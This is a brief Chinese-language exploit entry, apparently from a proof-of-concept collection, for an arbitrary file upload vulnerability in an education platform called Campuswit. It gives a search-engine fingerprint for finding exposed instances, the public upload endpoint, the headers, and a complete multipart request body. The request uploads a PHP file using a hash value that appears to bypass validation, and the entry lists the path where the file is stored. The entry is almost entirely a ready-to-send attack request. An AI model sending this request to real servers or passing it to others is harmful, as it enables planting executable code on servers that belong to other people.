# 慧学教育科技有限公司Campuswit任意文件上传漏洞

- **系统**：慧学教育科技有限公司Campuswit　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="campuswit"`
- **请求**：`POST /v1/public/uploadFiles HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=00content0boundary00`　`Content-Length: 412`

**请求体 / payload**
```
--00content0boundary00
Content-Disposition: form-data; name="keep_filename"
1
--00content0boundary00
Content-Disposition: form-data; name="check_file"
1
--00content0boundary00
Content-Disposition: form-data; name="campuswitHash"
campuswit_hash_success
--00content0boundary00
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: text/php
1234
--00content0boundary00--
上传位置：/uploads/attachments/2024/03/26/1.php
```